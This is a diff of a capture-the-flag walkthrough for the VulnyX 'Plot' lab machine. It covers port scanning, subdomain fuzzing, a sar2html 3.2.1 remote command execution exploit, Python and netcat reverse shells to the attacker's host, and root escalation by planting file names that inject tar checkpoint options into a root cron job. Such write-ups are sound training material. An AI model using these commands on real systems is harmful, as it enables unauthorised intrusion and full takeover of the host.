@@ -27,7 +27,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 60.42 seconds
 ```
+There are 2 open ports:
+- Port 22/SSH: OpenSSH 8.4p1 
+- Port 80/HTTP: Apache httpd 2.4.56
+
 #### Nikto
+Use `nikto` to scan web vulnerablities in the target machine address.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ nikto -C all -h 192.168.100.183  
@@ -49,13 +54,17 @@ Nmap done: 1 IP address (1 host up) scanned in 60.42 seconds
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
+Result: Detected strange Header: `x-custom-header: pl0t.nyx` -> could be an internal domain name.
+
 #### Fuzzing (Discover Subdomains)
+Open the system configuration file `/etc/hosts` on Linux, used to map hostname -> local IP address to add `pl0t.nyx` pointing to IP `192.168.100.183`.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ sudo nano /etc/hosts
 ```
 ![etc/hosts](/walkthroughs/vulnyx/low-difficulty/plot/etc-hosts.png)
 
+Use `ffuf` to brute-force find subdomains or directory.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 10701 -H "Host: FUZZ.pl0t.nyx" -u "http://pl0t.nyx"
@@ -85,10 +94,13 @@ ________________________________________________
 sar                     [Status: 200, Size: 4812, Words: 494, Lines: 87, Duration: 11ms]
 :: Progress: [3742/114442] :: Job [1/1] :: 843 req/sec :: Duration: [0:00:18] :: Errors::
 ```
+We found subdomain `sar.pl0t.nyx` returning HTTP 200, size difference. This could be a hidden subdomain containing another application or service.
 
 ![sar-web](/walkthroughs/vulnyx/low-difficulty/plot/sar-web.png)
+The `sar.pl0t.nyx` subdomain that we access in the browser is running an application called `sar2html` version 3.2.1.
 
 ### Shell
+Use `searchsploit` to search for published exploits for `sar2html (3.2.1)`.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ searchsploit sar2html 3.2.1
@@ -110,6 +122,9 @@ File Type: Python script, ASCII text executable
 Copied to: /tmp/49344.py
 
 ```
+`sar2html version 3.2.1` has a serious vulnerability that allows romote command execution (RCE) via the `plot` parameter.
+
+We have obtained a PoC exploit `49344.py` for the RCE vulnerability in `sar2html 3.2.1`, which can be used for testing or exploitation.
 
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
@@ -135,13 +150,15 @@ www-data
 
 Command => 
 ```
+Run the Python exploit file `49344.py` that was previously copied from `searchsploit`.As the result, we have successfully executed the remote command on the target server, and the web server process is running under user `www-data`.
+
+Open a listenning socket on port 443 at the Kali machine.
 ```bash
-                                                                                     
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ nc -lvnp 443
 listening on [any] 443 ...
 ```
-
+On remote command, we run the reverse shell script written in python.
 ```bash
 Command => whoami
 HPUX
@@ -152,6 +169,7 @@ www-data
 Command => python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("192.168.100.172",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh", "-i"]);'
 
 ```
+We will receive a remote shell on the Kali machine.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ nc -lvnp 443
@@ -164,7 +182,7 @@ plot
 ```
 
 ### Privilege Escalation
-
+We download the `pspy64` tool on the Kali machine, then open a simple web server on port 80.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
@@ -181,7 +199,7 @@ pspy64
 └─$ python -m http.server 80                              
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
-
+So, the target machine can download `pspy64` from the Kali machine to the `/tmp` directory. Then, we change the file permission so that it is executed as a program.
 ```bash
 www-data@plot:/var/www/vhost$ cd /tmp   
 cd /tmp
@@ -213,6 +231,7 @@ drwxr-xr-x 18 root     root        4096 Aug  3  2023 ..
 -rwxr-xr-x  1 www-data www-data 3104768 Jan 17  2023 pspy64
 ```
 
+We run `pspy64` and save the results to `pspy.txt` then run `cat pspy.txt` to observe the process and cron jobs on the target machine without needing `root` permisison. 
 ```bash
 www-data@plot:/tmp$ cat pspy.txt
 cat pspy.txt
@@ -328,22 +347,25 @@ done
 2026/04/21 16:45:01 CMD: UID=0     PID=1808   | /bin/sh -c gzip 
 2026/04/21 16:45:44 CMD: UID=33    PID=1809   | /bin/bash 
 ```
+We detect a cronjob running as `root`, this is usually an opportunity for escalation of privilege: if content in `var/www/html` can be edited.
 
+Use the following command serquence to escalate privilege taking advantage of cronjob `tar` running as `root`.
 ```bash
 www-data@plot:/var/www/html$ echo "" > " --checkpoint-action=exec=sh reverse-shell.sh"
 www-data@plot:/var/www/html$ echo "" > --checkpoint=1
 www-data@plot:/var/www/html$ nano reverse-shell.sh 
 www-data@plot:/var/www/html$ chmod +x reverse-shell.sh 
 ```
-![reverse-shell](/walkthroughs/vulnyx/low-difficulty/plot/reverse-shell.sh)
+![reverse-shell](/walkthroughs/vulnyx/low-difficulty/plot/reverse-shell.png)
 
-Open socket listenner in Kali linux port 443
+Open socket listenner in Kali linux port 443 and run `cat reverse-shell.sh` in target machine.
 
 ```bash
 www-data@plot:/var/www/html$ cat reverse-shell.sh 
 #!/bin/bash
 nc -c /bin/bash 192.168.100.172 443
 ```
+We have reverse shell from the target machine, elevated it to `root`, and improved the shell to be fully interactive.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ nc -lvnp 443
@@ -356,7 +378,6 @@ which python3
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 root@plot:/var/www/html# 
 ```
-
 #### Flags
 ```bash
 root@plot:~# find / -name root.txt -o -name user.txt | xargs cat
